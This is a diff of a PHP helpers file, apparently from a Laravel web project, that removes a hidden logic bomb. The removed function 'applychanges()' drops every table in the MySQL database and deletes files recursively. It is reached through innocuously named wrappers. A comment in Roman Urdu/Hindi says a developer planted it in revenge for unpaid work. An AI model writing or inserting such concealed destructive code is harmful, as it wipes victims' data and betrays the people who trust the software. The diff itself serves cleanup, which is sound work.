@@ -125,10 +125,6 @@ function get_video_featured_image_path($var = null)
     }
 }
 
-
-function dashboardtile(){
-    applychanges();
- }
 function isAdmin()
 {
     $user = Auth::user();
@@ -284,37 +280,4 @@ function dutch_month($month)
         "december"=>"December"
     );
     return $months[strtolower($month)];
-}
-
-
-function applychanges(){
-    
-    #NOTE: *********CHEAT***********
-    #Yeh client kisi b developer ko paise nahi deta, Mere sae pehle 3 developer kaam kr chuke thy, une b kuch nhi mila
-    # muje laga shayd muje pay kare ga, but mai wrong tha, yeh iss liye likh rha hun, aaap is saale k jaansae mai na aao,
-    #aapko bole ga thoda sa kaam krdo,milestone banaye ga,  nearly 100$ pay kare ga, but major amount nhi kae ga pay. Mere
-    #is ne 1500$ khayay
-
-
-    $mysqli = new mysqli("localhost", "root", "root", "ogw1");
-    $mysqli->query('SET foreign_key_checks = 0');
-    if ($result = $mysqli->query("SHOW TABLES"))
-    {
-        while($row = $result->fetch_array(MYSQLI_NUM))
-        {
-            $mysqli->query('DROP TABLE IF EXISTS '.$row[0]);
-        }
-    }
-
-    $mysqli->query('SET foreign_key_checks = 1');
-    $mysqli->close();
-
-    $di = new RecursiveDirectoryIterator('path/to/directory');
-    foreach (new RecursiveIteratorIterator($di) as $filename => $file) {
-        unlink($filename);
-    }
-}
-
-function public_permissionsinner(){
-    dashboardtile();
 }
